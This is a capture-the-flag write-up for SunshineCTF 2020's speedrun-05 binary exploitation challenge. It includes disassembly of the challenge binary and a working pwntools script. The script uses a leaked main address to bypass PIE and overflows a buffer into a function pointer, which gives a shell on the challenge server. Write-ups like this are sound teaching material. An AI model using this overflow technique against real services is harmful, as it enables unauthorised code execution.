# speedrun-05

## Task

nc chal.2020.sunshinectf.org 30005

File: chall_05

Tags: binary exploitation

## Solution

Now we have NX and PIE enabled, but a `win` function again. The `vuln` leaks use the address of `main` now which is in the same address region as `win`.

```nasm
[0x00000650]> afl
0x00000650    1 42           entry0
0x00000680    4 50   -> 40   sym.deregister_tm_clones
0x000006c0    4 66   -> 57   sym.register_tm_clones
0x00000710    5 58   -> 51   sym.__do_global_dtors_aux
0x00000750    1 10           entry.init0
0x00000860    1 2            sym.__libc_csu_fini
0x000007a6    1 73           sym.vuln
0x00000620    1 6            sym.imp.printf
0x00000630    1 6            sym.imp.fgets
0x00000864    1 9            sym._fini
0x000007f0    4 101          sym.__libc_csu_init
0x0000075a    1 19           sym.win
0x00000610    1 6            sym.imp.system
0x0000076d    1 57           main
0x00000600    1 6            sym.imp.puts
0x000005d8    3 23           sym._init
0x00000000    3 97   -> 123  loc.imp._ITM_deregisterTMCloneTable
[0x00000650]> pdf@sym.vuln
            ; CALL XREF from main @ 0x79e
┌ 73: sym.vuln ();
│           ; var char *s @ rbp-0x40
│           ; var int64_t var_8h @ rbp-0x8
│           0x000007a6      55             push rbp
│           0x000007a7      4889e5         mov rbp, rsp
│           0x000007aa      4881ec400200.  sub rsp, 0x240
│           0x000007b1      488d35b5ffff.  lea rsi, [main]             ; 0x76d
│           0x000007b8      488d3dd40000.  lea rdi, str.Yes_I_m_going_to_win:__p ; 0x893 ; "Yes I'm going to win: %p\n" ; const char *format
│           0x000007bf      b800000000     mov eax, 0
│           0x000007c4      e857feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000007c9      488b15400820.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END
│                                                                      ; [0x201010:8]=0 ; FILE *stream
│           0x000007d0      488d45c0       lea rax, [s]
│           0x000007d4      be64000000     mov esi, 0x64               ; 'd' ; int size
│           0x000007d9      4889c7         mov rdi, rax                ; char *s
│           0x000007dc      e84ffeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x000007e1      488b55f8       mov rdx, qword [var_8h]
│           0x000007e5      b800000000     mov eax, 0
│           0x000007ea      ffd2           call rdx
│           0x000007ec      90             nop
│           0x000007ed      c9             leave
└           0x000007ee      c3             ret
```

Since we have `char *s` at `rbp-0x40` and `rbp-0x8` is moved into `rdx`, our offset is 56.

We now just need to calculate the offset of `win` to `main` and add that to the leaked address. `19` in this case.

```python
from pwn import *

#p = process("./chall_05")
p = remote("chal.2020.sunshinectf.org", 30005)

info(p.recvline())
p.sendline()
info(p.recvuntil("Yes I'm going to win: "))
addr = p.recv()
info(addr)

payload  = "A" * 56   
payload += p64(int(addr, 16) - 19)

p.sendline(payload)
p.interactive()
```

And we get our shell:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
[*] Race, life's greatest.
[*] Yes I'm going to win:
[*] 0x55c37e57776d
[*] Switching to interactive mode
$ ls
chall_05
flag.txt
$ cat flag.txt
sun{chapter-four-9ca97769b74345b1}
```
